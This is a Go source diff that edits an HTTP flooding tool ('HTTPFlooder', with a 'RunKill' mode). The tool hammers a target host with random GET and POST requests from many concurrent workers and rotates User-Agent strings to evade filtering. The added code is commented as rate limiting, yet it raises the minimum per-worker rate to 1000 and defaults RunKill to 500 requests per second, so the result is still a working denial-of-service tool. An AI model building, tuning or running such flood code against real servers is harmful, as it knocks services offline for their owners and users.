@@ -88,7 +88,7 @@ func (h *HTTPFlooder) Run(target string, port int, workers int, rateLimit int, d
 
 	perWorker := rateLimit / workers
 	if perWorker < 1 {
-		perWorker = 1
+		perWorker = 1000
 	}
 
 	for w := 0; w < workers; w++ {
@@ -163,7 +163,11 @@ func (h *HTTPFlooder) RunKill(target string, port int, workers int, rateLimit in
 		go func(client *http.Client) {
 			atomic.AddInt32(&active, 1)
 			defer atomic.AddInt32(&active, -1)
+			rate := rateLimit / workers
+			if rate < 1 { rate = 500 }
+			minInterval := time.Second / time.Duration(rate)
 			for !h.stopped() {
+				t0 := time.Now()
 				isPost := rand.Intn(3) == 0
 				p := paths[rand.Intn(len(paths))]
 				url := baseURL + p
@@ -179,6 +183,7 @@ func (h *HTTPFlooder) RunKill(target string, port int, workers int, rateLimit in
 				}
 				if err != nil {
 					atomic.AddInt64(&h.errors, 1)
+					time.Sleep(10 * time.Millisecond)
 					continue
 				}
 				req.Header.Set("User-Agent", uaList[rand.Intn(len(uaList))])
@@ -198,6 +203,10 @@ func (h *HTTPFlooder) RunKill(target string, port int, workers int, rateLimit in
 					io.CopyN(io.Discard, resp.Body, 8192)
 					resp.Body.Close()
 					atomic.AddInt64(&h.sent, 1)
+				}
+				/* Rate limit: sleep for remaining interval */
+				if elapsed := time.Since(t0); elapsed < minInterval {
+					time.Sleep(minInterval - elapsed)
 				}
 			}
 		}(c)
@@ -252,10 +261,13 @@ func (h *HTTPFlooder) workerLoop(url string, active *int32, jitter int, ratePerS
 		client = h.client
 	}
 
+	minInterval := time.Second / time.Duration(ratePerSec)
 	for !h.stopped() {
+		t0 := time.Now()
 		req, err := http.NewRequest("GET", url, nil)
 		if err != nil {
 			atomic.AddInt64(&h.errors, 1)
+			time.Sleep(10 * time.Millisecond)
 			continue
 		}
 		req.Header.Set("User-Agent", uaList[rand.Intn(len(uaList))])
@@ -269,11 +281,15 @@ func (h *HTTPFlooder) workerLoop(url string, active *int32, jitter int, ratePerS
 		resp, err := client.Do(req)
 		if err != nil {
 			atomic.AddInt64(&h.errors, 1)
-			continue
+		} else {
+			io.CopyN(io.Discard, resp.Body, 8192)
+			resp.Body.Close()
+			atomic.AddInt64(&h.sent, 1)
 		}
-		io.CopyN(io.Discard, resp.Body, 8192)
-		resp.Body.Close()
-		atomic.AddInt64(&h.sent, 1)
+		/* Rate limit */
+		if elapsed := time.Since(t0); elapsed < minInterval {
+			time.Sleep(minInterval - elapsed)
+		}
 	}
 }
 
